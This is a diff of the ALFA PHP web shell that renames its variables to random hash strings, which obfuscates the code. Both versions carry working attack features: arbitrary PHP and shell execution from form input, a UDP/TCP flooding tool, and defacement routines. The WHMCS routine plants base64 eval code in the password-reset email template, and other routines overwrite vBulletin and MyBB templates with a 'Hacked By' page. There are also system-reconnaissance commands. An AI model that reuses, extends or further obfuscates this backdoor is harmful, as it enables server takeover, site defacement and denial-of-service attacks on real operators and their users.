 echo '</form><pre id="PhpOutput" style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
 if(!empty($_POST['alfa1'])){
 if($_POST['alfa3']=="php"){
 ob_start();
 eval('?>'.$_POST['alfa1']);
-$result = htmlspecialchars(ob_get_clean());
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = htmlspecialchars(ob_get_clean());
 }elseif(_alfa_can_runCommand()&&$GLOBALS["sys"]=="unix"){
-	$lang = $_POST['alfa3'];
-	$filename = "temp".rand(11111,99999);
-	$temp = $tempdir."/".$filename ;
-	__write_file($filename, $_POST['alfa1']);
-	$result = alfaEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
-	@unlink($filename);
-	@unlink($temp);
+	$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_POST['alfa3'];
+	$ydojshxa435ed7e9f07f740abf511a62c00eef6e = "temp".rand(11111,99999);
+	$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = $htevsqbb739d36023175752110e878e3b5872b5e."/".$ydojshxa435ed7e9f07f740abf511a62c00eef6e ;
+	__write_file($ydojshxa435ed7e9f07f740abf511a62c00eef6e, $_POST['alfa1']);
+	$nmxeqhvab4a88417b3d0170d754c647c30b7216a = alfaEx("mv {$ydojshxa435ed7e9f07f740abf511a62c00eef6e} {$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f};{$phbpyamz7572559ca86e781ba8fe8073a0b725c6} {$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f};rm -f {$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f}");
+	@unlink($ydojshxa435ed7e9f07f740abf511a62c00eef6e);
+	@unlink($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);
 }
-echo '<textarea class="bigarea">'.$result.'</textarea>';
+echo '<textarea class="bigarea">'.$nmxeqhvab4a88417b3d0170d754c647c30b7216a.'</textarea>';
 }
 echo '</pre></div>';
 alfafooter();
 }
 function alfahash(){
-if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
-if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
-$stringTools = array(
+if(!function_exists('hex2bin')) {function hex2bin($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {return decbin(hexdec($fxuvmwpb83878c91171338902e0fe0fb97a8c47a));}}
+if(!function_exists('full_urlencode')) {function full_urlencode($fxuvmwpb83878c91171338902e0fe0fb97a8c47a){$yxarqqmp4b43b0aee35624cd95b910189b3dc231='';for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<strlen($fxuvmwpb83878c91171338902e0fe0fb97a8c47a);++$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741)$yxarqqmp4b43b0aee35624cd95b910189b3dc231.= '%'.dechex(ord($fxuvmwpb83878c91171338902e0fe0fb97a8c47a[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]));return strtoupper($yxarqqmp4b43b0aee35624cd95b910189b3dc231);}}
+$adqpxutw8808d58642e6f03be4b9ea079b599994 = array(
 'Base64_encode ( $string )' => '__ZW5jb2Rlcg($s)',
 'Base64_decode ( $string )' => '__ZGVjb2Rlcg($s)',
 'strrev ( $string )' => 'strrev($s)',
@@ -3361,19 +3434,19 @@ $stringTools = array(
 alfahead();
 echo '<div class=header>';
 echo "<form onSubmit='g(\"hash\",null,this.selectTool.value,this.input.value);return false;'><div class='txtfont'>Method:</div> <select name='selectTool' style='width:400px;'>";
-foreach($stringTools as $k => $v)
-echo "<option value='".htmlspecialchars($v)."' ".($_POST['alfa1']==$v?'selected':'').">".$k."</option>";
+foreach($adqpxutw8808d58642e6f03be4b9ea079b599994 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a)
+echo "<option value='".htmlspecialchars($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)."' ".($_POST['alfa1']==$hvlrcxnj9e3669d19b675bd57058fd4664205d2a?'selected':'').">".$damiszkt8ce4b16b22b58894aa86c421e8759df3."</option>";
 echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['alfa1'])?'':htmlspecialchars(@$_POST['alfa2']))."</textarea></form>";
 if(!empty($_POST['alfa1'])){
-$string = addslashes($_POST['alfa2']);
-$string = str_replace('\"','"',$string);
-$alg = $_POST['alfa1'];
-$code = str_replace('$s',"'".$string."'",$alg);
+$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = addslashes($_POST['alfa2']);
+$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = str_replace('\"','"',$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
+$zxiywaref24233114ac85fb3be6785293636ca46 = $_POST['alfa1'];
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = str_replace('$s',"'".$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21."'",$zxiywaref24233114ac85fb3be6785293636ca46);
 ob_start();
-eval('echo '.$code.';');
-$res = ob_get_contents();
+eval('echo '.$nndigmblc13367945d5d4c91047b3b50234aa7ab.';');
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = ob_get_contents();
 ob_end_clean();
-if(in_array($alg, $stringTools))echo '<textarea class="bigarea">'.htmlspecialchars($res).'</textarea>';
+if(in_array($zxiywaref24233114ac85fb3be6785293636ca46, $adqpxutw8808d58642e6f03be4b9ea079b599994))echo '<textarea class="bigarea">'.htmlspecialchars($ybaqpbzt9b207167e5381c47682c6b4f58a623fb).'</textarea>';
 }
 echo "</div>";
 alfaFooter();
@@ -3384,27 +3457,27 @@ echo '<div class=header>';
 echo '<center><p><div class="txtfont_header">| DOS |</div></p><form onSubmit="g(\'dos\',null,this.host.value,this.time.value,this.port.value,this.m.value); return false;"><div class="txtfont">Method : <select name="m" style="width:80px;"><option value="udp">UDP</option><option value="tcp">TCP</option></select> Host : <input name="host" type="text" value="localhost" size="25" /> Time : <input name="time" type="text" size="15" /> Port : <input name="port" type="text" size="10" /> <input type="submit" value=" " /></div></form></center><br>';
 if(!empty($_POST['alfa1']) && !empty($_POST['alfa2']) && !empty($_POST['alfa3'])){
 echo __pre();
-$packets=0;
+$roshmacmc9c17db3d29de9a4d3525da0f2bdfe20=0;
 ignore_user_abort(true);
-$exec_time=(int)$_POST['alfa2'];
-$time=time();
-$max_time=$exec_time+$time;
-$host=$_POST['alfa1'];
-$port=(int)$_POST['alfa3'];
-$method=$_POST['alfa4'];
-$out = str_repeat('X',65000);
+$dwkwvdayd169cd9a694edb8eb8b81e78879f1d4c=(int)$_POST['alfa2'];
+$ouidxbfr07cc694b9b3fc636710fa08b6922c42b=time();
+$ulbxkxcqfc441d9bc628f21c76d7a4ce937749f2=$dwkwvdayd169cd9a694edb8eb8b81e78879f1d4c+$ouidxbfr07cc694b9b3fc636710fa08b6922c42b;
+$wlerpykf67b3dba8bc6778101892eb77249db32e=$_POST['alfa1'];
+$fbwqabyz901555fb06e346cb065ceb9808dcfc25=(int)$_POST['alfa3'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=$_POST['alfa4'];
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = str_repeat('X',65000);
 while(1){
-$packets++;
-if(time() > $max_time){
+$roshmacmc9c17db3d29de9a4d3525da0f2bdfe20++;
+if(time() > $ulbxkxcqfc441d9bc628f21c76d7a4ce937749f2){
 break;
 }
-$fp = @fsockopen($method.'://'.$host, $port, $errno, $errstr, 5);
-if($fp){
-fwrite($fp, $out);
-fclose($fp);
+$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @fsockopen($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce.'://'.$wlerpykf67b3dba8bc6778101892eb77249db32e, $fbwqabyz901555fb06e346cb065ceb9808dcfc25, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 5);
+if($zngnwtjj0666f0acdeed38d4cd9084ade1739498){
+fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $vemvtkqkc68271a63ddbc431c307beb7d2918275);
+fclose($zngnwtjj0666f0acdeed38d4cd9084ade1739498);
 }
 }
-echo "<center>$packets (" . @round(($packets*65)/1024, 2) . " MB) packets averaging ". @round($packets/$exec_time, 2) . " packets per second</center>";
+echo "<center>$roshmacmc9c17db3d29de9a4d3525da0f2bdfe20 (" . @round(($roshmacmc9c17db3d29de9a4d3525da0f2bdfe20*65)/1024, 2) . " MB) packets averaging ". @round($roshmacmc9c17db3d29de9a4d3525da0f2bdfe20/$dwkwvdayd169cd9a694edb8eb8b81e78879f1d4c, 2) . " packets per second</center>";
 echo "</pre>";
 }
 echo '</div>';
@@ -3421,7 +3494,7 @@ echo __pre();
 echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
 <p><center>".getConfigHtml('whmcs')."<form onSubmit=\"g('IndexChanger',null,null,null,'whmcs',this.fname.value,this.path.value,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\">
 ";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
@@ -3433,45 +3506,45 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
-$s0levisible="Powered By Solevisible";
-$dbu = $_POST['alfa6'];
-$path = $_POST['alfa5'];
-$fname = $_POST['alfa4'];
-$dbn = $_POST['alfa7'];
-$dbp = $_POST['alfa8'];
-$dbh = $_POST['alfa9'];
-$index = $_POST['alfa10'];
-$index = str_replace("\'","'",$index);
-$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $solevisible = fopen("'.$fname.'","w"); fwrite($solevisible,$x);';
-$saveData = __ZW5jb2Rlcg($deface);
-$Def = '{php}eval(base64_decode("'.$saveData.'"));{/php}';
-if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
-$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
-$soleSave=@mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
-$soleGet = mysqli_fetch_assoc($soleSave);
-$tempSave1 = $soleGet['message'];
-$tempSave = str_replace("'","\'",$tempSave1);
-$inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
-$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
-$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
+$fwmapdirb9351233dc7d704fd944824721024dfb="Powered By Solevisible";
+$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa6'];
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa5'];
+$mistjjzta3da707b651c79ecc39a4986516180b2 = $_POST['alfa4'];
+$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa7'];
+$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa8'];
+$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa9'];
+$hdnhijeh6a992d5529f459a44fee58c733255e86 = $_POST['alfa10'];
+$hdnhijeh6a992d5529f459a44fee58c733255e86 = str_replace("\'","'",$hdnhijeh6a992d5529f459a44fee58c733255e86);
+$ferhtamo59700156c351703cbe8c8fd6906cbf4d = '$x = base64_decode("'.__ZW5jb2Rlcg($hdnhijeh6a992d5529f459a44fee58c733255e86).'"); $solevisible = fopen("'.$mistjjzta3da707b651c79ecc39a4986516180b2.'","w"); fwrite($solevisible,$x);';
+$vfsrtugr82963a666691ccbd70eee42aa93c1382 = __ZW5jb2Rlcg($ferhtamo59700156c351703cbe8c8fd6906cbf4d);
+$ulwagaezdde5c8d4149c5072d2cb798706663e78 = '{php}eval(base64_decode("'.$vfsrtugr82963a666691ccbd70eee42aa93c1382.'"));{/php}';
+if(!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775)&&!empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda)&&!empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21)&&!empty($hdnhijeh6a992d5529f459a44fee58c733255e86)){
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$opcdvzxn2f7c038d5d136408be8fe0506ecbe989=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select message from tblemailtemplates where name='Password Reset Validation'");
+$jlghjstf72956065c7d6a9706978c03d86a6a579 = mysqli_fetch_assoc($opcdvzxn2f7c038d5d136408be8fe0506ecbe989);
+$zomeopxz5afebf01d42bfdc7d07222bca225eadd = $jlghjstf72956065c7d6a9706978c03d86a6a579['message'];
+$nwsybgtvdfe88d6af280e0ce512e3fb549b63280 = str_replace("'","\'",$zomeopxz5afebf01d42bfdc7d07222bca225eadd);
+$vagiaqvoa181b4673216ad247a0f78066a9646e1 = "UPDATE tblemailtemplates SET message='$ulwagaezdde5c8d4149c5072d2cb798706663e78' WHERE name='Password Reset Validation'";
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$vagiaqvoa181b4673216ad247a0f78066a9646e1) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5 = "insert into tblclients (email) values('solevisible@fbi.gov')";
+$ecwemfrq486a9bbc2c582b30c8899b6f20a7e59e =@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 if(function_exists('curl_version')){
-$AlfaSole = new AlfaCURL(true);
-$saveurl = $AlfaSole->Send($path."/pwreset.php");
-$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
-$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
-$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
+$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87 = new AlfaCURL(true);
+$xlxkfxnna14152b8ce9d915a253ff5f08bb98856 = $yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php");
+$snxircere71105459c77e7298b33c904bdf742be = preg_match("/name=\"token\" value=\"(.*?)\"/i",$xlxkfxnna14152b8ce9d915a253ff5f08bb98856,$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2);
+$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php","post","token={$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2[1]}&action=reset&email=solevisible@fbi.gov");
+$xvddzlni9518b395576a418af8d4f2a87042b7d7 = "UPDATE tblemailtemplates SET message='{$nwsybgtvdfe88d6af280e0ce512e3fb549b63280}' WHERE name='Password Reset Validation'";
+$qyzyxyfr54e6dce5bb57581b9fffe5c2f7d54f44 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$xvddzlni9518b395576a418af8d4f2a87042b7d7) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 __alert('File Created...');
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/".$mistjjzta3da707b651c79ecc39a4986516180b2."'>Click Here !</a></font></b></center><br><br>";
 }else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/".$mistjjzta3da707b651c79ecc39a4986516180b2." \"</font></b></center><br><br>";
 }}}}
 if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
 echo __pre();
@@ -3479,7 +3552,7 @@ echo __pre();
 echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
 <p><center>".getConfigHtml('vb')."<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
 ";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
@@ -3490,30 +3563,30 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
-$s0levisible="Powered By Solevisible";
-$dbu = $_POST['alfa2'];
-$dbn = $_POST['alfa3'];
-$dbp = $_POST['alfa4'];
-$dbh = $_POST['alfa5'];
-$index = $_POST['alfa6'];
-$prefix = $_POST['alfa7'];
-$index=str_replace("\'","'",$index);
-$set_index = "{\${eval(base64_decode(\'";
-$set_index .= __ZW5jb2Rlcg("echo \"$index\";");
-$set_index .= "\'))}}{\${exit()}}";
-if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
-$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
-$loli1 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='spacer_open'";
-$loli2 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='FORUMHOME'";
-$loli3 = "UPDATE ".$prefix."style SET css='".$set_index."".$s0levisible."', stylevars='', csscolors='', editorstyles=''";
-@mysqli_query($conn,$loli1) or die (mysqli_error($conn));
-@mysqli_query($conn,$loli2) or die (mysqli_error($conn));
-@mysqli_query($conn,$loli3) or die (mysqli_error($conn));
+$fwmapdirb9351233dc7d704fd944824721024dfb="Powered By Solevisible";
+$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa2'];
+$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa3'];
+$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa4'];
+$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa5'];
+$hdnhijeh6a992d5529f459a44fee58c733255e86 = $_POST['alfa6'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa7'];
+$hdnhijeh6a992d5529f459a44fee58c733255e86=str_replace("\'","'",$hdnhijeh6a992d5529f459a44fee58c733255e86);
+$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c = "{\${eval(base64_decode(\'";
+$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c .= __ZW5jb2Rlcg("echo \"$hdnhijeh6a992d5529f459a44fee58c733255e86\";");
+$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c .= "\'))}}{\${exit()}}";
+if(!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775)&&!empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda)&&!empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21)&&!empty($hdnhijeh6a992d5529f459a44fee58c733255e86)){
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$vgenjcotc767d1d85da1e060c115771a4649b1bd = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."template SET template='".$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c."".$fwmapdirb9351233dc7d704fd944824721024dfb."' WHERE title='spacer_open'";
+$ootxykrk1bdfe8b473d942088eeba476b1a5e6eb = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."template SET template='".$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c."".$fwmapdirb9351233dc7d704fd944824721024dfb."' WHERE title='FORUMHOME'";
+$oevwgemd9861df89a551ea94a0af88e26fb15584 = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."style SET css='".$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c."".$fwmapdirb9351233dc7d704fd944824721024dfb."', stylevars='', csscolors='', editorstyles=''";
+@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$vgenjcotc767d1d85da1e060c115771a4649b1bd) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ootxykrk1bdfe8b473d942088eeba476b1a5e6eb) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$oevwgemd9861df89a551ea94a0af88e26fb15584) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 __alert('VB index changed...!');
 }
 }
@@ -3524,7 +3597,7 @@ echo __pre();
 echo "<center><center><div class='txtfont_header'>| Mybb |</div>
 <p><center>".getConfigHtml('mybb')."<form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
 ";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
@@ -3533,21 +3606,21 @@ $table = array('td1' =>
  'td4' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
 <title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['alfa6'])){
-$mybb_dbh = $_POST['alfa6'];
-$mybb_dbu = $_POST['alfa7'];
-$mybb_dbn = $_POST['alfa8'];
-$mybb_dbp = $_POST['alfa9'];
-$mybb_index = $_POST['alfa10'];
-if(!empty($mybb_dbh)&&!empty($mybb_dbu)&&!empty($mybb_dbn)&&!empty($mybb_index)){
-$conn=@mysqli_connect($mybb_dbh,$mybb_dbu,$mybb_dbp,$mybb_dbn) or die(mysqli_error($conn));
-$prefix="mybb_";
-$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'";
-$result =@mysqli_query($conn,$loli7) or die (mysqli_error($conn));
+$tyzmzvud9033a0a66a4ee0d8a6ca4fd6e6c7d548 = $_POST['alfa6'];
+$baqcsdoy61d1e57e80a0c21a6e90bb12173417fc = $_POST['alfa7'];
+$mezmjkbtfea64cafc5ec4eebb94d05d73cd78bd8 = $_POST['alfa8'];
+$nybabksea192d1127fd635f248d0946a59c88cb4 = $_POST['alfa9'];
+$quflsduuf54bd7c54894db20b09cca64c076d090 = $_POST['alfa10'];
+if(!empty($tyzmzvud9033a0a66a4ee0d8a6ca4fd6e6c7d548)&&!empty($baqcsdoy61d1e57e80a0c21a6e90bb12173417fc)&&!empty($mezmjkbtfea64cafc5ec4eebb94d05d73cd78bd8)&&!empty($quflsduuf54bd7c54894db20b09cca64c076d090)){
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($tyzmzvud9033a0a66a4ee0d8a6ca4fd6e6c7d548,$baqcsdoy61d1e57e80a0c21a6e90bb12173417fc,$nybabksea192d1127fd635f248d0946a59c88cb4,$mezmjkbtfea64cafc5ec4eebb94d05d73cd78bd8) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a="mybb_";
+$ghrecjtee13f7a3ce53a131f25f3885b7d41ed6f = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."templates SET template='".$quflsduuf54bd7c54894db20b09cca64c076d090."' WHERE title='index'";
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a =@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ghrecjtee13f7a3ce53a131f25f3885b7d41ed6f) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 __alert('MyBB index changed...!');
 }
 }
@@ -3562,7 +3635,7 @@ echo "<Div class=header><br><center>";
 if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
 $_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
 if($GLOBALS['sys']=="win"){
-$process=array(
+$kuiuelsn5075140835d0bc504791c76b04c33d2b=array(
 "Task List" =>"tasklist /V",
 "System Info" =>"systeminfo",
 "Active Connections" => "netstat -an",
@@ -3572,7 +3645,7 @@ $process=array(
 "ARP Table" => "arp -a",
 "IP Configuration" => "ipconfig /all"
 );}else{
-$process=array(
+$kuiuelsn5075140835d0bc504791c76b04c33d2b=array(
 "Process status" => "ps aux",
 "Syslog" =>"cat /etc/syslog.conf",
 "Resolv" => "cat /etc/resolv.conf",
@@ -3585,14 +3658,14 @@ $process=array(
 "Uptime"=>"uptime",
 "Fstab" =>"cat /etc/fstab"
 );}
-foreach($process as $n => $link){
-echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$link.'\')"> | '.$n.' | </a>';
+foreach($kuiuelsn5075140835d0bc504791c76b04c33d2b as $qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 => $rsrmsacs2a304a1348456ccd2234cd71a81bd338){
+echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$rsrmsacs2a304a1348456ccd2234cd71a81bd338.'\')"> | '.$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1.' | </a>';
 }
 echo "</center><br>";
 if(!empty($_POST['alfa1'])){
 echo "<pre class='ml1' style='margin-top:5px' >";
-if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."';";}
-echo alfaEx($cmd.$_POST['alfa1'], true);
